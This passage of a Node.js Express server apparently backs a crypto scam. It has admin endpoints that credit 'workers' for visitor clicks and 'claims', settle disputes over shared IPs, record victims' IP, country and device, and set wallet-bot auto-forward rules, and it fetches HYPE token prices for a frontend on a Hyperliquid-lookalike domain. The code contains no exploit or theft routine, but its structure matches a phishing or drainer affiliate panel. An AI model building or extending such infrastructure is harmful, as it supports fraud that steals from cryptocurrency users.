  const pendingClaims = await dbGet("SELECT COUNT(*) as count FROM claims WHERE status = 'PENDING'");
  const clashCount = await dbGet("SELECT COUNT(*) as count FROM disputes");
  const expiredCount = await dbGet("SELECT COUNT(*) as count FROM claims WHERE status = 'EXPIRED'");
  const oneDayAgo = Date.now() - (24 * 60 * 60 * 1000);
  const activeToday = await dbGet("SELECT COUNT(*) as count FROM workers WHERE last_login_at > $1", [oneDayAgo]);

  res.json({
    activeWorkers: activeWorkers ? activeWorkers.count : 0, totalWorkers: totalWorkers ? totalWorkers.count : 0,
    totalClicks: totalClicks && totalClicks.sum ? totalClicks.sum : 0, totalClaims: totalClaims ? totalClaims.count : 0,
    pendingClaims: pendingClaims ? pendingClaims.count : 0, clashCount: clashCount ? clashCount.count : 0,
    expiredCount: expiredCount ? expiredCount.count : 0, activeToday: activeToday ? activeToday.count : 0,
    groupBotStatus: groupBotStatus,
  });
});

app.get('/api/admin/visitors', requireAdmin, async (req, res) => {
  const { search, workerId, dateFrom, dateTo } = req.query;
  let sql = 'SELECT * FROM visitors';
  const params = []; const conditions = []; let paramIndex = 1;

  if (search) { conditions.push('(LOWER(ip) LIKE $' + paramIndex + ' OR LOWER(country) LIKE $' + paramIndex + ' OR LOWER(device) LIKE $' + paramIndex + ')'); params.push('%' + search.toLowerCase() + '%'); paramIndex++; }
  if (workerId) { conditions.push('worker_id = $' + paramIndex++); params.push(workerId); }
  if (dateFrom) { conditions.push('timestamp >= $' + paramIndex++); params.push(new Date(dateFrom).getTime()); }
  if (dateTo) { conditions.push('timestamp <= $' + paramIndex++); params.push(new Date(dateTo).getTime()); }
  if (conditions.length) sql += ' WHERE ' + conditions.join(' AND ');
  sql += ' ORDER BY timestamp DESC';

  const rows = await dbAll(sql, params);
  res.json(rows);
});

app.get('/api/admin/pending', requireAdmin, async (req, res) => {
  const { search } = req.query;
  let sql = "SELECT * FROM claims WHERE status = 'PENDING' ORDER BY timestamp ASC";
  const params = [];
  if (search) { sql = "SELECT * FROM claims WHERE status = 'PENDING' AND (LOWER(worker_id) LIKE $1 OR ip LIKE $1) ORDER BY timestamp ASC"; params.push('%' + search.toLowerCase() + '%'); }

  let rows = await dbAll(sql, params);
  rows = rows.map(c => ({
    ...c, timeRemaining: Math.max(0, PENDING_TIMEOUT_MS - (Date.now() - c.timestamp)),
    timeRemainingText: formatTimeRemaining(Math.max(0, PENDING_TIMEOUT_MS - (Date.now() - c.timestamp))),
    expiresAt: c.timestamp + PENDING_TIMEOUT_MS,
  }));
  res.json(rows);
});

app.get('/api/admin/disputes', requireAdmin, async (req, res) => {
  const { search } = req.query;
  let sql = 'SELECT * FROM disputes ORDER BY timestamp DESC';
  const params = [];
  if (search) { sql = 'SELECT * FROM disputes WHERE ip LIKE $1 OR worker_ids::text LIKE $1 ORDER BY timestamp DESC'; params.push('%' + search + '%'); }

  const rows = await dbAll(sql, params);
  res.json(rows.map(r => ({ ...r, workerIds: r.worker_ids || [], claimIds: r.claim_ids || [] })));
});

app.get('/api/admin/claims', requireAdmin, async (req, res) => {
  const { search, status, workerId } = req.query;
  let sql = 'SELECT * FROM claims';
  const params = []; const conditions = []; let paramIndex = 1;

  if (search) { conditions.push('(LOWER(id) LIKE $' + paramIndex + ' OR LOWER(worker_id) LIKE $' + paramIndex + ' OR ip LIKE $' + paramIndex + ')'); params.push('%' + search.toLowerCase() + '%'); paramIndex++; }
  if (status) { conditions.push('status = $' + paramIndex++); params.push(status); }
  if (workerId) { conditions.push('worker_id = $' + paramIndex++); params.push(workerId); }
  if (conditions.length) sql += ' WHERE ' + conditions.join(' AND ');
  sql += ' ORDER BY timestamp DESC';

  const rows = await dbAll(sql, params);
  res.json(rows);
});

app.get('/api/admin/group-bot-status', requireAdmin, (req, res) => {
  res.json({ status: groupBotStatus, lastPing: Date.now(), groupChatId: GROUP_CHAT_ID, walletBotId: WALLET_BOT_ID });
});

app.get('/api/admin/click-map', requireAdmin, async (req, res) => {
  const countries = await dbAll(`SELECT country, COUNT(*) as count FROM visitors WHERE country IS NOT NULL GROUP BY country ORDER BY count DESC LIMIT 10`);
  const devices = await dbAll(`SELECT device, COUNT(*) as count FROM visitors WHERE device IS NOT NULL GROUP BY device ORDER BY count DESC LIMIT 10`);
  const referrers = await dbAll(`SELECT referrer, COUNT(*) as count FROM visitors WHERE referrer IS NOT NULL AND referrer != 'Direct' GROUP BY referrer ORDER BY count DESC LIMIT 10`);
  const workers = await dbAll(`SELECT worker_id, COUNT(*) as count FROM visitors WHERE worker_id IS NOT NULL GROUP BY worker_id ORDER BY count DESC LIMIT 10`);
  res.json({ countries, devices, referrers, workers });
});

app.post('/api/admin/claims/:id/forfeit', requireAdmin, async (req, res) => {
  const claim = await dbGet('SELECT * FROM claims WHERE id = $1', [req.params.id]);
  if (!claim) return res.status(404).json({ error: 'Claim not found' });
  await dbRun('UPDATE claims SET status = $1, processed_at = $2, resolution = $3 WHERE id = $4',
    ['FORFEITED', Date.now(), 'MANUAL_FORFEIT', req.params.id]);
  res.json({ success: true });
});

app.post('/api/admin/claims/:id/extend', requireAdmin, async (req, res) => {
  const claim = await dbGet('SELECT * FROM claims WHERE id = $1', [req.params.id]);
  if (!claim) return res.status(404).json({ error: 'Claim not found' });
  const newTimestamp = claim.timestamp + (30 * 60 * 1000);
  await dbRun('UPDATE claims SET timestamp = $1 WHERE id = $2', [newTimestamp, req.params.id]);
  res.json({ success: true });
});

app.post('/api/admin/disputes/:id/forfeit', requireAdmin, async (req, res) => {
  const dispute = await dbGet('SELECT * FROM disputes WHERE id = $1', [req.params.id]);
  if (!dispute) return res.status(404).json({ error: 'Dispute not found' });
  const claimIds = dispute.claim_ids || [];
  for (const cid of claimIds) {
    await dbRun('UPDATE claims SET status = $1, processed_at = $2, resolution = $3 WHERE id = $4',
      ['FORFEITED', Date.now(), 'DISPUTE_FORFEIT', cid]);
  }
  res.json({ success: true });
});

app.get('/api/admin/rules', requireAdmin, async (req, res) => {
  const rules = await getRules();
  res.json(rules);
});

app.put('/api/admin/rules', requireAdmin, async (req, res) => {
  const { walletKeyword, autoForwardPatterns, pendingTimeoutHours, matchField } = req.body;
  const updates = []; const params = []; let paramIndex = 1;

  if (walletKeyword !== undefined) { updates.push('wallet_keyword = $' + paramIndex++); params.push(walletKeyword); }
  if (autoForwardPatterns !== undefined) { updates.push('auto_forward_patterns = $' + paramIndex++); params.push(autoForwardPatterns.join(',')); }
  if (pendingTimeoutHours !== undefined) { updates.push('pending_timeout_hours = $' + paramIndex++); params.push(pendingTimeoutHours); }
  if (matchField !== undefined) { updates.push('match_field = $' + paramIndex++); params.push(matchField); }

  if (updates.length) await dbRun(`UPDATE rules SET ${updates.join(', ')} WHERE id = 1`, params);
  const rules = await getRules();
  res.json({ success: true, rules });
});

let priceCache = { price: 41.65, change24h: 0, lastFetch: 0, failedAttempts: 0 };

// Fetch HYPE price from multiple sources with fallback
// Primary: Hyperliquid native API | Fallback: Binance
async function fetchHypePrice() {
  // Try Hyperliquid first
  try {
    const response = await axios.post('https://api.hyperliquid.xyz/info', {
      type: 'allMids'
    }, {
      timeout: 10000,
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      }
    });

    const mids = response.data;

    // Try direct HYPE key (perp)
    if (mids && mids.HYPE) {
      const price = parseFloat(mids.HYPE);
      if (!isNaN(price) && price > 0) {
        return { price, success: true, source: 'hyperliquid' };
      }
    }

    // Try @107 (HYPE spot index on mainnet)
    if (mids && mids['@107']) {
      const price = parseFloat(mids['@107']);
      if (!isNaN(price) && price > 0) {
        return { price, success: true, source: 'hyperliquid-spot' };
      }
    }

    // Dynamic lookup via spotMeta
    const spotResponse = await axios.post('https://api.hyperliquid.xyz/info', {
      type: 'spotMeta'
    }, {
      timeout: 10000,
      headers: { 'Content-Type': 'application/json' }
    });

    const universe = spotResponse.data?.universe || [];
    const tokens = spotResponse.data?.tokens || [];

    const hypePair = universe.find(u => u.tokens && u.tokens.includes(150));
    if (hypePair) {
      const key = `@${hypePair.index}`;
      if (mids && mids[key]) {
        const price = parseFloat(mids[key]);
        if (!isNaN(price) && price > 0) {
          return { price, success: true, source: 'hyperliquid-dynamic' };
        }
      }
    }

    const hypeToken = tokens.find(t => t.name === 'HYPE');
    if (hypeToken && mids && mids[hypeToken.index]) {
      const price = parseFloat(mids[hypeToken.index]);
      if (!isNaN(price) && price > 0) {
        return { price, success: true, source: 'hyperliquid-token' };
      }
    }

    for (const key of Object.keys(mids)) {
      if (key.toUpperCase().includes('HYPE')) {
        const price = parseFloat(mids[key]);
        if (!isNaN(price) && price > 0) {
          return { price, success: true, source: 'hyperliquid-scan' };
        }
      }
    }
  } catch (hlErr) {
    console.log('[Price] Hyperliquid API failed:', hlErr.message);
  }

  // Fallback: Binance API (HYPEUSDT spot)
  try {
    const binanceRes = await axios.get('https://api.binance.com/api/v3/ticker/price?symbol=HYPEUSDT', {
      timeout: 10000,
      headers: { 'Accept': 'application/json' }
    });
    const price = parseFloat(binanceRes.data?.price);
    if (!isNaN(price) && price > 0) {
      return { price, success: true, source: 'binance' };
    }
  } catch (bnErr) {
    console.log('[Price] Binance fallback failed:', bnErr.message);
  }

  return { price: null, success: false, error: 'All price sources failed' };
}

app.get('/api/price', async (req, res) => {
  const now = Date.now();
  const baseCache = 30 * 1000; // 30 seconds cache for live trading price
  const CACHE_MS = baseCache;

  if (priceCache.lastFetch > 0 && (now - priceCache.lastFetch < CACHE_MS)) {
    return res.json({ 
      price: priceCache.price, 
      change: priceCache.change24h, 
      cached: true, 
      nextUpdateIn: Math.round((CACHE_MS - (now - priceCache.lastFetch)) / 1000) 
    });
  }

  try {
    const result = await fetchHypePrice();

    if (result.success && result.price) {
      // Calculate 24h change if we have history, otherwise keep previous
      const prevPrice = priceCache.price || result.price;
      const change24h = prevPrice !== result.price 
        ? ((result.price - prevPrice) / prevPrice) * 100 
        : priceCache.change24h || 0;

      priceCache = { 
        price: result.price, 
        change24h: parseFloat(change24h.toFixed(2)), 
        lastFetch: now, 
        failedAttempts: 0 
      };

      res.json({ 
        price: priceCache.price, 
        change: priceCache.change24h, 
        cached: false,
        source: 'hyperliquid-api'
      });
    } else {
      throw new Error(result.error || 'Failed to fetch HYPE price');
    }
  } catch (err) {
    console.error('[Price] Hyperliquid API failed:', err.message);
    priceCache.failedAttempts = (priceCache.failedAttempts || 0) + 1;
    priceCache.lastFetch = now;

    res.json({ 
      price: priceCache.price, 
      change: priceCache.change24h, 
      cached: true, 
      stale: true, 
      source: 'cache-fallback',
      error: 'Live price unavailable, showing cached value'
    });
  }
});

app.get('/config.json', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.sendFile(path.join(__dirname, 'config.json'));
});

app.get('/admin', (req, res) => { res.sendFile(path.join(__dirname, 'admin.html')); });
app.get('/worker', (req, res) => { res.sendFile(path.join(__dirname, 'worker.html')); });

app.get('/', (req, res) => {
  res.json({
    status: 'API Server Running', message: 'Frontend is served from https://hyperliquid-community.xyz',
    endpoints: { price: '/api/price', trackVisit: '/api/track-visit', claim: '/api/claim', workerLogin: '/api/worker/login', adminLogin: '/api/admin/login', groupMessage: '/api/group-message' }
  });
});

const VISITOR_TTL_MS = parseInt(process.env.VISITOR_TTL) || 3600000;
const CLEANUP_INTERVAL_MS = 15 * 60 * 1000;

setInterval(async () => {
  try {
    const cutoff = Date.now() - VISITOR_TTL_MS;
    const result = await dbRun('DELETE FROM visitors WHERE timestamp < $1', [cutoff]);
    if (result.changes > 0) console.log(`[Cleanup] Auto-deleted ${result.changes} visitor(s) older than 1 hour`);
  } catch (err) { console.error('[Cleanup] Error during visitor cleanup:', err.message); }
}, CLEANUP_INTERVAL_MS);

async function startServer() {
  await initDb();
  try { startGroupBot(); }
  catch (err) { console.error('[Server] Group bot failed to start, continuing without it:', err.message); groupBotStatus = 'OFFLINE'; }

  httpServer = app.listen(PORT, '0.0.0.0', () => {
    console.log('========================================');
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`🌍 Environment: ${process.env.NODE_ENV || 'development'}`);
    console.log(`🔗 Domain: ${BASE_URL}`);
    console.log(`👤 Admin Panel: ${BASE_URL}/admin`);
    console.log(`💼 Worker Portal: ${BASE_URL}/worker`);
    console.log(`🤖 Telegram Bot: ${TELEGRAM_CHAT_ID}`);
    console.log(`📢 Group Chat: ${GROUP_CHAT_ID}`);
    console.log(`💾 Database: Neon PostgreSQL`);
    console.log('========================================');
  });
}

// Render: prevent "Connection reset by peer" errors
if (httpServer) {
  httpServer.keepAliveTimeout = 120000;
  httpServer.headersTimeout = 120000;
}

process.on('SIGINT', async () => {
  console.log('[Server] SIGINT received, shutting down gracefully...');
  try { await pool.end(); console.log('[PostgreSQL] Pool connection closed'); }
  catch (err) { console.error('[PostgreSQL] Error closing pool:', err.message); }
  if (httpServer) { httpServer.close(); console.log('[Server] HTTP server closed'); }
  process.exit(0);
});

process.on('SIGTERM', async () => {
  console.log('[Server] SIGTERM received, shutting down gracefully...');
  try { await pool.end(); console.log('[PostgreSQL] Pool connection closed'); }
  catch (err) { console.error('[PostgreSQL] Error closing pool:', err.message); }
  if (httpServer) { httpServer.close(); console.log('[Server] HTTP server closed'); }
  process.exit(0);
});

startServer().catch(err => { console.error('Failed to start server:', err); process.exit(1); });
